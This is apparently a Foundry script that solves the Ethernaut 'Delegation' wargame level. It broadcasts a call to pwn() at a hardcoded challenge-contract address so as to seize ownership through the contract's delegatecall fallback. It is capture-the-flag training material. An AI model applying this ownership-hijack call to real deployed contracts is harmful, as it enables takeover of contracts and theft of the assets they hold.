// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Delegate} from "../../src/Ethernaut/Delegation.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        address(0xFFe2882E5246B78D0F5Ab5F15972d777897525e2).call(
            abi.encodeWithSignature("pwn()")
        );
        vm.stopBroadcast();
    }
}
